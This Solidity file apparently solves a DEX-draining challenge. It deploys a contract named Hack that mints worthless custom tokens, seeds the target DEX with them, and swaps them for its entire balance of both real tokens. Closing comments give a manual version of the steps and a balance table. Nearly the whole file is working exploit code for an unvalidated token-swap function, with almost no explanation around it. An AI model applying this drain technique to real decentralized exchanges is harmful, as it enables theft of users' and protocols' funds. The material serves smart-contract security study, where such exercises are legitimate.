// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract Hack {
    constructor(IDex dex) {
        IERC20 token1 = IERC20(dex.token1());
        IERC20 token2 = IERC20(dex.token2());

        MyToken myToken1 = new MyToken();
        MyToken myToken2 = new MyToken();

        // Keep 1, send 1 to dex
        myToken1.mint(2);
        myToken2.mint(2);

        myToken1.transfer(address(dex), 1);
        myToken2.transfer(address(dex), 1);

        myToken1.approve(address(dex), 1);
        myToken2.approve(address(dex), 1);

        dex.swap(address(myToken1), address(token1), 1);
        dex.swap(address(myToken2), address(token2), 1);

        require(token1.balanceOf(address(dex)) == 0, "dex token1 balance != 0");
        require(token2.balanceOf(address(dex)) == 0, "dex token2 balance != 0");
    }
}

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract MyToken is IERC20 {
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function transfer(address recipient, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function mint(uint256 amount) external {
        balanceOf[msg.sender] += amount;
        totalSupply += amount;
        emit Transfer(address(0), msg.sender, amount);
    }

    function burn(uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
        emit Transfer(msg.sender, address(0), amount);
    }
}

// or simply
// create a new token Y
// mint for your self 400
// send 100 to the contract
// swap 100 for token 1. 
// this will withdraw all of token 1
// then swap 200 for all of token 2
// this will withdraw of of token 2

//       DEX             |      player  
// token1 - token2 - EVL | token1 - token2 - EVL
// ---------------------------------------------
//   100     100     100 |   10      10      300
//   0       100     200 |   110     10      200
//   0       0       400 |   110     110     0